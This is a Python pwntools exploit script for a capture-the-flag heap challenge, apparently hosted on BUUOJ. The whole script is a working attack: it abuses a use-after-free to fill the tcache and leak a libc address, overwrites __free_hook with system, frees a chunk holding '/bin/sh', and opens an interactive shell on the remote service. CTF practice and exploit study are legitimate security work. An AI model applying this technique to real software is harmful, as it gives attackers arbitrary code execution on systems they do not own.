#coding:utf-8

from pwn import *

context.log_level = 'debug'

debug = 0


def wpAdd(r, name, sex, infor):
	r.recvuntil('Give me your choice : \n')
	r.send('1'.ljust(8, '\x00'))

	r.recvuntil('input name\n')
	r.send(name.ljust(8, '\x00'))

	r.recvuntil('input sex\n')
	r.send(sex)

	r.recvuntil('input information\n')
	r.send(infor)

	
def wpShow(r, index):
	r.recvuntil('Give me your choice : \n')
	r.send('2'.ljust(8, '\x00'))

	r.recvuntil('Give me your index : \n')
	r.send(str(index))

	return r.recvuntil('\n')[:-1]


def wpEdit(r, index, sex, infor):
	r.recvuntil('Give me your choice : \n')
	r.send('3'.ljust(8, '\x00'))


	r.recvuntil('Give me your index : \n')
	r.send(str(index))

	r.recvuntil('Are you sure change sex?')
	r.send(sex.ljust(8, '\x00'))

	r.recvuntil('Now change information\n')
	r.send(infor)


def wpRemove(r, index):
	r.recvuntil('Give me your choice : \n')
	r.send('4'.ljust(8, '\x00'))

	r.recvuntil('Give me your index : \n')
	r.send(str(index))



def exp(debug):
	
	if debug == 1:
		r = process('./document')
		#gdb.attach(r)
		lib = ELF('/usr/lib/x86_64-linux-gnu/libc-2.30.so')
	else:
		r = remote('node3.buuoj.cn', 27877)
		lib = ELF('/usr/lib/x86_64-linux-gnu/libc-2.30.so')
	#首先填满tcache
	wpAdd(r, 'a', 'w', 'a'.ljust(0x70, '\x00'))	#index:0
	wpAdd(r, 'a', 'w', 'a'.ljust(0x70, '\x00'))	#index:1
	wpAdd(r, 'a', 'w', 'a'.ljust(0x70, '\x00'))	#index:2
	wpAdd(r, 'a', 'w', 'a'.ljust(0x70, '\x00'))	#index:3
	
	wpRemove(r, 2)
	wpEdit(r, 2, 'Y', 'a'.ljust(0x70, '\x00'))

	wpRemove(r, 3)	
	wpEdit(r, 3, 'Y', 'a'.ljust(0x70, '\x00'))
	wpRemove(r, 3)

	wpRemove(r, 0)
	wpEdit(r, 0, 'Y', 'a'.ljust(0x70, '\x00'))
	wpRemove(r, 0)

	wpRemove(r, 1)	
	wpEdit(r, 1, 'Y', 'a'.ljust(0x70, '\x00'))
	wpRemove(r, 1)

	
	

	#tcache此时已满，有7个
	wpRemove(r, 2)
	lib_base = u64(wpShow(r, 2).split('\n')[0].ljust(8, '\x00')) + (0x7f9fb5890b70 - 0x7f9fb5890be0) - lib.sym['__malloc_hook']

	free_hook = lib.sym['__free_hook']
	system = lib.sym['system']

	log.info('lib_base => %#x'%lib_base)

	wpAdd(r, p64(free_hook + lib_base), 'w', 'a'.ljust(0x70, '\x00'))	#index:4
	wpAdd(r, '/bin/sh\x00', 'w', 'a'.ljust(0x70, '\x00'))	#index:5

	wpAdd(r, p64(system + lib_base), 'w', 'a'.ljust(0x70, '\x00'))	#index:6
	
	wpRemove(r, 5)
	r.interactive()

exp(debug)
